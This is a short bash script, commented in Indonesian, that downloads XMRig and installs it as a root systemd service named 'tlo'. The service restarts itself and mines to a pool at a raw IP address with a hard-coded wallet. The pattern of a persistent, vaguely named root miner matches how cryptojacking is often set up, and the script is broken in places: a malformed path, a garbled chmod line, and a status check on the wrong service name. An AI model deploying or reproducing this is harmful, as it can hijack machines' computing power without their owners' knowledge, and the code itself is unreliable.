#!/bin/bash

# Step 1: Periksa apakah file cpuminer sudah ada
if [ ! -f "/root/cd xmrig-6.7.0/xmrig" ]; then
    # File cpuminer tidak ada, lakukan download
    wget https://github.com/xmrig/xmrig/releases/download/v6.7.0/xmrig-6.7.0-linux-x64.tar.gz && tar -xvf xmrig-6.7.0-linux-x64.tar.gz
fi

# Step 2: Buat file konfigurasi systemd
sudo tee /etc/systemd/system/tlo.service <<EOF
[Unit]
Description=Cpuminer Service
After=network.target

[Service]
ExecStart=/bin/bash -c "cd /root/cd xmrig-6.7.0 && chmod +x sudo ./xmrig --donate-level 1 -o 75.127.7.167:3333 -a cn-pico -u solo:TA3ZBrLtmc5A8YoXHQz8zS1HQa534H1g9ZJyuQAzth2Zf1YNxnLBZff9dnEP4ALhVNCDKaB3Q9tYrFgmjqMq57HL2oLJth8S5 -p x -k"
WorkingDirectory=/root
Restart=always
RestartSec=3
User=root

[Install]
WantedBy=multi-user.target
EOF

# Step 3: Setel izin pada file konfigurasi
sudo chmod 644 /etc/systemd/system/tlo.service

# Step 4: Muat ulang konfigurasi systemd
sudo systemctl daemon-reload

# Step 5: Mulai layanan cpuminer
sudo systemctl start tlo

# Tunggu selama 10 detik
sleep 10

# Periksa status layanan cpuminer
sudo systemctl status cpuminer
